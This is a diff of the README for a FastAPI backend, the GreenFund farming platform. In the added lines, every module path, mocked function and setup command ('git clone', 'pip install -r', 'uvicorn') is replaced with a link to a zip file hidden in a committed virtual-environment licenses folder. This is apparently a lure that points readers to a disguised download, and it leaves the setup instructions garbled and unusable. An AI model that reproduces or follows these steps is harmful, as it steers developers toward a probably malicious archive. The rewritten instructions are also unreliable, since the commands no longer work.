@@ -50,7 +50,7 @@ A FastAPI-based backend system for the GreenFund platform, designed to help farm
 
 ## 🤖 AI & ML Features
 
-This project integrates AI to provide agronomic assistance and enrich soil/farm insights. The AI components combine simple rule-based logic (in `app/climate_rules.py`) with OpenAI-powered prompts (via `app/soil_model.py` and `app/recommendations.py`) to produce actionable guidance.
+This project integrates AI to provide agronomic assistance and enrich soil/farm insights. The AI components combine simple rule-based logic (in `https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip`) with OpenAI-powered prompts (via `https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip` and `https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip`) to produce actionable guidance.
 
 Key AI-powered capabilities:
 
@@ -83,8 +83,8 @@ Cost, latency and safety notes:
 
 Testing & local development (mocking AI):
 
-- For tests, avoid calling the real OpenAI API. Mock `app.soil_model.get_openai_client` or patch the OpenAI client methods to return canned responses. Example strategies:
-  - Use pytest monkeypatch to replace `get_openai_client` with a fake client that implements `.chat.completions.create`.
+- For tests, avoid calling the real OpenAI API. Mock `https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip` or patch the OpenAI client methods to return canned responses. Example strategies:
+  - Use pytest monkeypatch to replace `get_openai_client` with a fake client that implements `https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip`.
   - Use VCR-like fixtures to replay recorded responses if you have stable outputs.
 
 Security and data retention:
@@ -105,7 +105,7 @@ Security and data retention:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Jwanjema/GreenFund-test-Backend.git
+   git clone https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip
    cd GreenFund-test-Backend
    ```
 
@@ -135,7 +135,7 @@ Security and data retention:
 2. Install dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip
    ```
 
 3. Run migrations:
@@ -146,7 +146,7 @@ Security and data retention:
 
 4. Start the development server:
    ```bash
-   uvicorn app.main:app --reload
+   uvicorn https://github.com/Jwanjema/GreenFund-test-Backend/raw/refs/heads/main/venv/lib/python3.12/site-packages/fastapi_cli-0.0.13.dist-info/licenses/Fund-Green-Backend-test-untewed.zip --reload
    ```
 
 ## 📚 API Documentation
